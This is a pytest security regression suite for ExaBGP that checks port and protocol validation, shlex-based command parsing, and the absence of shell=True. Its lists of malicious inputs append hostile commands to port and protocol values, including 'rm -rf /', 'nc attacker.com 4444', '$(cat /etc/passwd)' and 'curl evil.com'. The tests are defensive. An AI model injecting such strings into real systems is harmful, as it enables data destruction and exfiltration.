#!/usr/bin/env python3
"""
Security regression tests for ExaBGP.

Tests to ensure security vulnerabilities are properly fixed and do not regress.
"""

import pytest
import sys
import os

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from exabgp.application import flow


class TestCommandInjectionPrevention:
    """Test that command injection vulnerabilities are prevented."""

    def test_flow_port_validation_rejects_shell_metacharacters(self):
        """Ensure port validation rejects shell metacharacters."""
        malicious_ports = [
            "80; rm -rf /",
            "80 | nc attacker.com 4444",
            "80 `whoami`",
            "80$(cat /etc/passwd)",
            "80 && curl evil.com",
            "80\nrm -rf /",
        ]

        for port in malicious_ports:
            with pytest.raises(ValueError, match="Invalid port"):
                flow.ACL._validate_port(port)

    def test_flow_port_validation_accepts_valid_ports(self):
        """Ensure port validation accepts legitimate port values."""
        valid_ports = [
            "80",
            "443",
            "8080",
            "1:65535",
            "80,443,8080",
            "=80",  # BGP flowspec operator
            "!443",  # BGP flowspec operator
            ">1024",  # BGP flowspec operator
        ]

        for port in valid_ports:
            # Should not raise exception
            result = flow.ACL._validate_port(port)
            assert isinstance(result, str)
            # Verify no shell metacharacters in result
            assert ';' not in result
            assert '|' not in result
            assert '`' not in result
            assert '$' not in result
            assert '\n' not in result

    def test_flow_protocol_validation_rejects_invalid_protocols(self):
        """Ensure protocol validation rejects invalid values."""
        invalid_protocols = [
            "tcp; rm -rf /",
            "udp | nc attacker.com 4444",
            "tcp`whoami`",
            "icmp$(cat /etc/passwd)",
            "tcp && curl evil.com",
            "tcp\nrm -rf /",
            "invalid_proto",
            "999",  # Invalid protocol number
        ]

        for proto in invalid_protocols:
            with pytest.raises(ValueError, match="Invalid protocol"):
                flow.ACL._validate_protocol(proto)

    def test_flow_protocol_validation_accepts_valid_protocols(self):
        """Ensure protocol validation accepts legitimate protocols."""
        valid_protocols = [
            "tcp",
            "udp",
            "icmp",
            "esp",
            "ah",
            "sctp",
            "6",  # TCP
            "17",  # UDP
            "1",  # ICMP
        ]

        for proto in valid_protocols:
            # Should not raise exception
            result = flow.ACL._validate_protocol(proto)
            assert isinstance(result, str)
            # Verify no shell metacharacters in result
            assert ';' not in result
            assert '|' not in result
            assert '`' not in result
            assert '$' not in result
            assert '\n' not in result

    def test_flow_build_with_malicious_data_raises_error(self):
        """Ensure ACL building fails gracefully with malicious data."""
        malicious_flow = {
            'string': 'test',
            'protocol': ['tcp; rm -rf /'],
            'source-ipv4': ['192.168.1.1/32'],
            'destination-port': ['80'],
        }

        with pytest.raises(ValueError, match="Invalid"):
            flow.ACL._build(malicious_flow, 'drop')

    def test_flow_build_with_valid_data_succeeds(self):
        """Ensure ACL building succeeds with valid data."""
        valid_flow = {
            'string': 'test',
            'protocol': ['tcp'],
            'source-ipv4': ['192.168.1.1/32'],
            'destination-ipv4': ['10.0.0.1/32'],
            'source-port': ['1024:65535'],
            'destination-port': ['80,443'],
        }

        acl = flow.ACL._build(valid_flow, 'drop')
        assert isinstance(acl, str)
        assert '[iptables]' in acl
        assert '-A FORWARD' in acl
        assert '-p tcp' in acl
        assert '-s 192.168.1.1/32' in acl
        assert '-d 10.0.0.1/32' in acl
        assert '--sport 1024:65535' in acl
        assert '--dport 80,443' in acl
        assert '-j DROP' in acl
        # Ensure no shell metacharacters made it through
        assert ';' not in acl
        assert '|' not in acl
        assert '`' not in acl
        assert '$(' not in acl


class TestHealthcheckCommandParsing:
    """Test that healthcheck command parsing is secure."""

    def test_shlex_import_available(self):
        """Ensure shlex module is imported in healthcheck."""
        from exabgp.application import healthcheck
        assert hasattr(healthcheck, 'shlex')

    def test_check_function_uses_shlex_split(self):
        """Verify check() function safely parses commands."""
        from exabgp.application import healthcheck
        import inspect

        # Get source code of check function
        source = inspect.getsource(healthcheck.check)

        # Verify shlex.split is used
        assert 'shlex.split' in source, "check() should use shlex.split for command parsing"

        # Verify shell=False is used
        assert 'shell=False' in source, "check() should use shell=False"

        # Verify shell=True is NOT used (legacy vulnerability)
        assert 'shell=True' not in source, "check() should NOT use shell=True"


class TestSubprocessSecurityPatterns:
    """Test that subprocess calls follow security best practices."""

    def test_no_shell_true_in_healthcheck(self):
        """Ensure healthcheck.py does not use shell=True."""
        healthcheck_path = os.path.join(
            os.path.dirname(__file__), '..', 'src', 'exabgp', 'application', 'healthcheck.py'
        )

        with open(healthcheck_path, 'r') as f:
            content = f.read()

        # Should not have shell=True anywhere
        assert 'shell=True' not in content, "healthcheck.py should not use shell=True"

    def test_no_shell_true_in_flow(self):
        """Ensure flow.py subprocess calls use proper list format."""
        flow_path = os.path.join(
            os.path.dirname(__file__), '..', 'src', 'exabgp', 'application', 'flow.py'
        )

        with open(flow_path, 'r') as f:
            content = f.read()

        # Check that cl-acltool is called properly
        assert "['cl-acltool', '-i']" in content, "flow.py should use list format for subprocess"


class TestErrorHandling:
    """Test that error handling is specific and logged."""

    def test_flow_exceptions_are_specific(self):
        """Ensure flow.py doesn't use bare except."""
        flow_path = os.path.join(
            os.path.dirname(__file__), '..', 'src', 'exabgp', 'application', 'flow.py'
        )

        with open(flow_path, 'r') as f:
            content = f.read()

        # Count bare 'except Exception:' patterns
        lines = content.split('\n')
        bare_excepts = [line for line in lines if 'except Exception' in line and 'as' in line]

        # All exceptions should have 'as e' or similar for logging
        for line in lines:
            if 'except Exception' in line:
                assert ' as ' in line or line.strip().endswith(':'), \
                    f"Exception handling should capture exception object: {line}"

    def test_healthcheck_has_error_logging(self):
        """Ensure healthcheck errors are logged."""
        from exabgp.application import healthcheck
        import inspect

        # Get source of check function
        source = inspect.getsource(healthcheck.check)

        # Should have logger.error for exceptions
        assert 'logger.error' in source, "check() should log errors"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
